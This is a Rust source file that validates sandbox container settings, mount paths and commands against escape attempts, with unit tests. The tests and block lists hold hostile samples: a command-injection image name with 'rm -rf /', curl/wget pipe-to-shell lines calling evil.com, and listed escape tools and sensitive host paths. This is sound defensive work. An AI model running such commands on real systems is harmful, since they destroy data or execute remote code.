//! Validates sandbox configuration for security.
//!
//! Provides validation for bind mounts, sandbox configuration, and commands
//! to prevent container escapes, privilege escalation, and access to
//! sensitive host resources.
#![allow(dead_code)]

use anyhow::{bail, Result};
use tracing::debug;

use super::SandboxConfig;

/// Host paths that must never be bind-mounted into a sandbox container.
pub const BLOCKED_MOUNT_PATHS: &[&str] = &[
    "/etc",
    "/proc",
    "/sys",
    "/dev",
    "/var/run/docker.sock",
    "/boot",
    "/root",
    "/.ssh",
];

/// Network modes that must never be used for sandbox containers.
pub const BLOCKED_NETWORK_MODES: &[&str] = &["host"];

/// Commands that indicate an attempt to escape the sandbox.
const ESCAPE_COMMANDS: &[&str] = &["mount", "chroot", "nsenter", "unshare", "pivot_root"];

/// Commands that indicate Docker-in-Docker attempts.
const DOCKER_COMMANDS: &[&str] = &["docker", "dockerd", "containerd", "podman", "nerdctl"];

/// Suspicious characters that should not appear in Docker image names.
const SUSPICIOUS_IMAGE_CHARS: &[char] = &[';', '&', '|', '`', '$', '(', ')', '{', '}', '<', '>'];

/// Validate a bind mount path for security.
///
/// Checks that:
/// - The host path does not start with any blocked path
/// - The container path does not target sensitive locations
/// - Neither path contains `..` (path traversal)
pub fn validate_bind_mount(host_path: &str, container_path: &str) -> Result<()> {
    // Check for path traversal
    if host_path.contains("..") {
        bail!("Host path contains path traversal (..): {}", host_path);
    }
    if container_path.contains("..") {
        bail!(
            "Container path contains path traversal (..): {}",
            container_path
        );
    }

    // Normalize the host path for comparison
    let normalized_host = host_path.trim_end_matches('/');

    // Check host path against blocked paths
    for blocked in BLOCKED_MOUNT_PATHS {
        if normalized_host == *blocked || normalized_host.starts_with(&format!("{}/", blocked)) {
            bail!(
                "Host path '{}' is blocked: matches restricted path '{}'",
                host_path,
                blocked
            );
        }
    }

    // Check container path against sensitive locations
    let normalized_container = container_path.trim_end_matches('/');
    let sensitive_container_paths = [
        "/proc",
        "/sys",
        "/dev",
        "/etc/shadow",
        "/etc/passwd",
        "/etc/sudoers",
    ];
    for sensitive in &sensitive_container_paths {
        if normalized_container == *sensitive
            || normalized_container.starts_with(&format!("{}/", sensitive))
        {
            bail!(
                "Container path '{}' targets sensitive location '{}'",
                container_path,
                sensitive
            );
        }
    }

    debug!(
        "[SANDBOX] Bind mount validated: {} -> {}",
        host_path, container_path
    );
    Ok(())
}

/// Validate a sandbox configuration for security.
///
/// Returns a list of warnings about potentially risky settings.
/// Returns an error only if the configuration is fundamentally unsafe.
pub fn validate_sandbox_config(config: &SandboxConfig) -> Result<Vec<String>> {
    let mut warnings = Vec::new();

    // Check network mode
    let network_lower = config.network_mode.to_lowercase();
    for blocked in BLOCKED_NETWORK_MODES {
        if network_lower == *blocked {
            bail!(
                "Network mode '{}' is blocked for sandbox containers",
                config.network_mode
            );
        }
    }
    if network_lower != "none" {
        warnings.push(format!(
            "Network mode '{}' allows network access from sandbox",
            config.network_mode
        ));
    }

    // Parse and check memory limit
    if let Some(mem_bytes) = parse_memory_limit(&config.memory_limit) {
        let min_bytes = 64 * 1024 * 1024; // 64MB
        let max_bytes = 4u64 * 1024 * 1024 * 1024; // 4GB
        if mem_bytes < min_bytes {
            warnings.push(format!(
                "Memory limit '{}' is very low (< 64MB), commands may fail with OOM",
                config.memory_limit
            ));
        }
        if mem_bytes > max_bytes {
            warnings.push(format!(
                "Memory limit '{}' is very high (> 4GB)",
                config.memory_limit
            ));
        }
    } else {
        warnings.push(format!(
            "Could not parse memory limit '{}', Docker will validate it",
            config.memory_limit
        ));
    }

    // Check CPU limit
    if config.cpu_limit < 0.1 {
        warnings.push(format!(
            "CPU limit {} is very low (< 0.1), commands may be extremely slow",
            config.cpu_limit
        ));
    }
    if config.cpu_limit > 4.0 {
        warnings.push(format!(
            "CPU limit {} is high (> 4.0 cores)",
            config.cpu_limit
        ));
    }

    // Check image name for suspicious characters
    for ch in SUSPICIOUS_IMAGE_CHARS {
        if config.image.contains(*ch) {
            bail!(
                "Image name '{}' contains suspicious character '{}'",
                config.image,
                ch
            );
        }
    }
    if config.image.is_empty() {
        bail!("Image name must not be empty");
    }

    // Check that blocked_paths are applied
    if config.blocked_paths.is_empty() {
        warnings.push(
            "No blocked paths configured — bind mounts will not be restricted by path policy"
                .to_string(),
        );
    }

    // Check timeout
    if config.timeout_seconds == 0 {
        warnings.push("Timeout is 0 seconds — commands will be killed immediately".to_string());
    } else if config.timeout_seconds > 3600 {
        warnings.push(format!(
            "Timeout {} seconds is very long (> 1 hour)",
            config.timeout_seconds
        ));
    }

    if !warnings.is_empty() {
        debug!(
            "[SANDBOX] Config validation produced {} warnings",
            warnings.len()
        );
    }

    Ok(warnings)
}

/// Validate a command before sandbox execution.
///
/// Blocks attempts to escape the sandbox or perform Docker-in-Docker operations.
pub fn validate_command(command: &str) -> Result<()> {
    let lower = command.to_lowercase();
    let tokens: Vec<&str> = lower.split_whitespace().collect();

    // Check for sandbox escape commands
    for escape in ESCAPE_COMMANDS {
        // Check if it appears as a standalone token (not embedded in another word)
        for token in &tokens {
            let base = token.rsplit('/').next().unwrap_or(token);
            if base == *escape {
                bail!(
                    "Command blocked: '{}' could be used to escape the sandbox",
                    escape
                );
            }
        }
    }

    // Check for Docker-in-Docker attempts
    for docker_cmd in DOCKER_COMMANDS {
        for token in &tokens {
            let base = token.rsplit('/').next().unwrap_or(token);
            if base == *docker_cmd {
                bail!(
                    "Command blocked: '{}' Docker-in-Docker is not allowed",
                    docker_cmd
                );
            }
        }
    }

    // Check for piped-to-shell patterns (e.g., curl | sh, wget | bash)
    if (lower.contains("curl") || lower.contains("wget"))
        && (lower.contains("| sh")
            || lower.contains("| bash")
            || lower.contains("|sh")
            || lower.contains("|bash")
            || lower.contains("| /bin/sh")
            || lower.contains("| /bin/bash"))
    {
        bail!("Command blocked: piping downloaded content to shell is not allowed");
    }

    debug!("[SANDBOX] Command validated: {}", command);
    Ok(())
}

/// Parse a Docker-style memory limit string into bytes.
///
/// Supports suffixes: b, k, m, g (case-insensitive).
fn parse_memory_limit(limit: &str) -> Option<u64> {
    let trimmed = limit.trim().to_lowercase();
    if trimmed.is_empty() {
        return None;
    }

    let (num_part, multiplier) = if trimmed.ends_with('g') {
        (&trimmed[..trimmed.len() - 1], 1024u64 * 1024 * 1024)
    } else if trimmed.ends_with('m') {
        (&trimmed[..trimmed.len() - 1], 1024u64 * 1024)
    } else if trimmed.ends_with('k') {
        (&trimmed[..trimmed.len() - 1], 1024u64)
    } else if trimmed.ends_with('b') {
        (&trimmed[..trimmed.len() - 1], 1u64)
    } else {
        (trimmed.as_str(), 1u64) // Assume bytes if no suffix
    };

    num_part.parse::<u64>().ok().map(|n| n * multiplier)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Bind mount validation ──────────────────────────────────────────

    #[test]
    fn test_validate_bind_mount_blocks_etc() {
        assert!(validate_bind_mount("/etc", "/mnt/etc").is_err());
        assert!(validate_bind_mount("/etc/passwd", "/mnt/passwd").is_err());
    }

    #[test]
    fn test_validate_bind_mount_blocks_proc() {
        assert!(validate_bind_mount("/proc", "/mnt/proc").is_err());
        assert!(validate_bind_mount("/proc/1/status", "/mnt/status").is_err());
    }

    #[test]
    fn test_validate_bind_mount_blocks_docker_socket() {
        assert!(validate_bind_mount("/var/run/docker.sock", "/var/run/docker.sock").is_err());
    }

    #[test]
    fn test_validate_bind_mount_blocks_path_traversal() {
        assert!(validate_bind_mount("/home/user/../etc", "/mnt").is_err());
        assert!(validate_bind_mount("/safe", "/mnt/../../etc").is_err());
    }

    #[test]
    fn test_validate_bind_mount_blocks_sensitive_container_paths() {
        assert!(validate_bind_mount("/home/user/data", "/proc").is_err());
        assert!(validate_bind_mount("/home/user/data", "/sys").is_err());
        assert!(validate_bind_mount("/home/user/data", "/etc/shadow").is_err());
    }

    #[test]
    fn test_validate_bind_mount_allows_safe_paths() {
        assert!(validate_bind_mount("/home/user/project", "/workspace").is_ok());
        assert!(validate_bind_mount("/tmp/data", "/data").is_ok());
    }

    // ── Config validation ──────────────────────────────────────────────

    #[test]
    fn test_validate_config_default_is_ok() {
        let config = SandboxConfig::default();
        let result = validate_sandbox_config(&config);
        assert!(result.is_ok());
    }

    #[test]
    fn test_validate_config_blocks_host_network() {
        let mut config = SandboxConfig::default();
        config.network_mode = "host".to_string();
        assert!(validate_sandbox_config(&config).is_err());
    }

    #[test]
    fn test_validate_config_warns_on_bridge_network() {
        let mut config = SandboxConfig::default();
        config.network_mode = "bridge".to_string();
        let warnings = validate_sandbox_config(&config).unwrap();
        assert!(
            warnings.iter().any(|w| w.contains("network access")),
            "Should warn about network access with bridge mode"
        );
    }

    #[test]
    fn test_validate_config_warns_low_memory() {
        let mut config = SandboxConfig::default();
        config.memory_limit = "32m".to_string();
        let warnings = validate_sandbox_config(&config).unwrap();
        assert!(warnings.iter().any(|w| w.contains("very low")));
    }

    #[test]
    fn test_validate_config_warns_high_memory() {
        let mut config = SandboxConfig::default();
        config.memory_limit = "8g".to_string();
        let warnings = validate_sandbox_config(&config).unwrap();
        assert!(warnings.iter().any(|w| w.contains("very high")));
    }

    #[test]
    fn test_validate_config_warns_low_cpu() {
        let mut config = SandboxConfig::default();
        config.cpu_limit = 0.05;
        let warnings = validate_sandbox_config(&config).unwrap();
        assert!(warnings.iter().any(|w| w.contains("very low")));
    }

    #[test]
    fn test_validate_config_warns_high_cpu() {
        let mut config = SandboxConfig::default();
        config.cpu_limit = 8.0;
        let warnings = validate_sandbox_config(&config).unwrap();
        assert!(warnings.iter().any(|w| w.contains("high")));
    }

    #[test]
    fn test_validate_config_blocks_suspicious_image() {
        let mut config = SandboxConfig::default();
        config.image = "ubuntu; rm -rf /".to_string();
        assert!(validate_sandbox_config(&config).is_err());
    }

    #[test]
    fn test_validate_config_blocks_empty_image() {
        let mut config = SandboxConfig::default();
        config.image = String::new();
        assert!(validate_sandbox_config(&config).is_err());
    }

    #[test]
    fn test_validate_config_warns_empty_blocked_paths() {
        let mut config = SandboxConfig::default();
        config.blocked_paths.clear();
        let warnings = validate_sandbox_config(&config).unwrap();
        assert!(warnings.iter().any(|w| w.contains("No blocked paths")));
    }

    #[test]
    fn test_validate_config_warns_zero_timeout() {
        let mut config = SandboxConfig::default();
        config.timeout_seconds = 0;
        let warnings = validate_sandbox_config(&config).unwrap();
        assert!(warnings.iter().any(|w| w.contains("0 seconds")));
    }

    #[test]
    fn test_validate_config_warns_long_timeout() {
        let mut config = SandboxConfig::default();
        config.timeout_seconds = 7200;
        let warnings = validate_sandbox_config(&config).unwrap();
        assert!(warnings.iter().any(|w| w.contains("very long")));
    }

    // ── Command validation ─────────────────────────────────────────────

    #[test]
    fn test_validate_command_blocks_mount() {
        assert!(validate_command("mount -t proc proc /proc").is_err());
    }

    #[test]
    fn test_validate_command_blocks_chroot() {
        assert!(validate_command("chroot /newroot /bin/bash").is_err());
    }

    #[test]
    fn test_validate_command_blocks_nsenter() {
        assert!(validate_command("nsenter -t 1 -m -u -i -n -p").is_err());
    }

    #[test]
    fn test_validate_command_blocks_docker_in_docker() {
        assert!(validate_command("docker run -it ubuntu bash").is_err());
        assert!(validate_command("podman run ubuntu").is_err());
    }

    #[test]
    fn test_validate_command_blocks_curl_pipe_sh() {
        assert!(validate_command("curl http://evil.com/install.sh | sh").is_err());
        assert!(validate_command("wget http://evil.com/x | bash").is_err());
    }

    #[test]
    fn test_validate_command_allows_safe_commands() {
        assert!(validate_command("ls -la /tmp").is_ok());
        assert!(validate_command("echo hello world").is_ok());
        assert!(validate_command("cat /tmp/output.txt").is_ok());
        assert!(validate_command("python3 -c 'print(1+1)'").is_ok());
    }

    #[test]
    fn test_validate_command_allows_mount_as_substring() {
        // "amount" contains "mount" but should be allowed
        assert!(validate_command("echo amount").is_ok());
    }

    // ── Memory limit parsing ───────────────────────────────────────────

    #[test]
    fn test_parse_memory_limit() {
        assert_eq!(parse_memory_limit("512m"), Some(512 * 1024 * 1024));
        assert_eq!(parse_memory_limit("1g"), Some(1024 * 1024 * 1024));
        assert_eq!(parse_memory_limit("256k"), Some(256 * 1024));
        assert_eq!(parse_memory_limit("1024b"), Some(1024));
        assert_eq!(parse_memory_limit("1024"), Some(1024));
        assert_eq!(parse_memory_limit(""), None);
        assert_eq!(parse_memory_limit("abc"), None);
    }
}
